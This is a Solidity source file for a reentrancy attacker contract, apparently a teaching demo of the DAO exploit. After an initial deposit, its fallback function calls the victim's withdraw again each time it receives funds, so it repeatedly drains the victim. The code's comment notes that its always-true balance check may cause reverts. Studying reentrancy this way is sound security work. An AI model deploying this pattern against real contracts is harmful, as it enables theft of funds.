// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;
import "./IDAOVictim.sol";

contract DAOAttacker {
    IDAOVictim victim;

    constructor(IDAOVictim victim_address) {
        victim = victim_address;
    }

    function attack() external payable {
        victim.deposit();
        victim.withdraw(address(this));
    }

    fallback() external {
        // may be a better expression in if statement,
        // this version may lead to REVERT;
        if (address(this).balance >= 0) {
            victim.withdraw(address(this));
        }
    }
}
